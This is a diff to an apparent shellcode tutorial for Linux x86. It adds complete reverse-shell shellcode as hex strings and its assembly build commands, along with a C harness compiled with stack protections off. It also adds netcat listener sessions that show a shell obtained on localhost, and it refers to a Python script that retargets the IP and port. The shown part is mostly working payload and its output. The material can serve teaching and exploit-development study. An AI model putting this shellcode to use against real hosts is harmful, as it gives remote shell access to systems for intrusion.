@@ -63,14 +63,7 @@ int main(int argc, int *argv[])
 }
 ```
 
-Before starting, a list of linux x86 systemcall can be found in the following files
-```console
-#cat /usr/include/asm/unistd_32.h
-```
-On older distributions the file is stored here:
-```console
-#cat /usr/include/i386-linux-gnu/asm/unistd_32.h
-```
+
 Now, let's get to work.
 =
 
@@ -233,6 +226,33 @@ mov al, 0xb         ;system call number for execve
 int 0x80            ;go for it
 ```
 
+Let's open a port:
+```console
+kali@kali:/tmp$ nc -lvnp 5555
+listening on [any] 5555 ...
+
+```
+
+Let's compile and execute it: 
+```console
+kali@kali:/tmp/$ nasm -f elf32 -o reverse_shell.o reverse_shell.nasm
+kali@kali:/tmp/$ ld -m elf_i386 -z execstack -o reverse_shell reverse_shell.o
+kali@kali:/tmp/$ ./reverse
+```
+
+We get our shell after executing the shellcode:
+```console
+kali@kali:/tmp$ nc -lvnp 5555
+listening on [any] 5555 ...
+connect to [127.1.1.1] from (UNKNOWN) [127.0.0.1] 50746
+id
+uid=1000(kali) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),128(lpadmin),132(scanner)
+whoami
+kali
+
+```
+
+
 # Second step: make the ip and port configuration easy
 
 Before explaining the python script used for this task, we need to retrieve the hexadecimal format of our shellcode. But instead of a simple '\x' before our hexadecimal value, we will need two of them '\\\x'. 
@@ -241,7 +261,7 @@ Why ? Because our python script won't interpret our shellcode without this part.
 
 We can easily do that by using the following objdump command:
 ```console
-#objdump -d ./reverse_shell |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+kali@kali:/tmp$ objdump -d ./reverse_shell |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
 
 "\\x89\\xe5\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x50\\x50\\x68\\x7f\\x01\\x01\\x01\\x66\\x68\\x15\\xb3\\x66\\x6a\\x02\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc6\\x31\\xc0\\x66\\xb8\\x6a\\x01\\x89\\xf3\\x89\\xe1\\x89\\xef\\x29\\xe7\\x89\\xfa\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xf3\\xfe\\xc9\\xcd\\x80\\xfe\\xc1\\xe2\\xf2\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80"
 ```
@@ -285,9 +305,9 @@ print(shellcode)
 
 This script will give us the following result:
 ```console
-#python3 modify_reverse_shell.py 127.0.0.7 2222
+kali@kali:/tmp$ python3 modify_reverse_shell.py 127.0.0.7 2222
 
-\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x50\x68\x7F\x00\x00\x07\x66\x68\x08\xae\x66\x6a\x02\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc6\x31\xc0\x66\xb8\x6a\x01\x89\xf3\x89\xe1\x89\xef\x29\xe7\x89\xfa\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xf3\xfe\xc9\xcd\x80\xfe\xc1\xe2\xf2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80
+\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x50\x68\x7F\x01\x01\x01\x66\x68\x08\xae\x66\x6a\x02\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc6\x31\xc0\x66\xb8\x6a\x01\x89\xf3\x89\xe1\x89\xef\x29\xe7\x89\xfa\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xf3\xfe\xc9\xcd\x80\xfe\xc1\xe2\xf2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80
 ```
 
 In order to test it, we can now used this return and add it to a C program which will execute our shellcode
@@ -299,7 +319,7 @@ The C program source code (this code can be found at root directory named 'test_
 
 // reverse_shell.nasm shellcode is stored here
 unsigned char code[] = \
-"\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x50\x68\x7F\x00\x00\x07\x66\x68\x08\xae\x66\x6a\x02\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc6\x31\xc0\x66\xb8\x6a\x01\x89\xf3\x89\xe1\x89\xef\x29\xe7\x89\xfa\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xf3\xfe\xc9\xcd\x80\xfe\xc1\xe2\xf2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80";
+"\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x50\x68\x7F\x01\x01\x01\x66\x68\x08\xae\x66\x6a\x02\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc6\x31\xc0\x66\xb8\x6a\x01\x89\xf3\x89\xe1\x89\xef\x29\xe7\x89\xfa\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xf3\xfe\xc9\xcd\x80\xfe\xc1\xe2\xf2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80";
 
 main()
 {
@@ -315,13 +335,27 @@ main()
 
 We will use netcat to open a port on localhost:
 ```console
-nc -lvnp 2222
+kali@kali:/tmp$ nc -lvnp 2222
+listening on [any] 2222 ...
+
 ```
 
 On another terminal, we will compile it and execute it:
 ```console
-#gcc test_shellcode.c -o test_shellcode -m32 -fno-stack-protector -z execstack
-#./test_shellcode 
-Shellcode Length:  14
+kali@kali:/tmp$ gcc test_shellcode.c -o test_shellcode -m32 -fno-stack-protector -z execstack
+kali@kali:/tmp$ ./test_shellcode 
+Shellcode Length:  95
+
 ```
 
+Finaly, netcat can be used to access our shell:
+```console
+kali@kali:/tmp$ nc -lvnp 2222
+listening on [any] 2222 ...
+connect to [127.1.1.1] from (UNKNOWN) [127.0.0.1] 52346
+id
+uid=1000(kali) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),128(lpadmin),132(scanner)
+whoami
+kali
+
+```
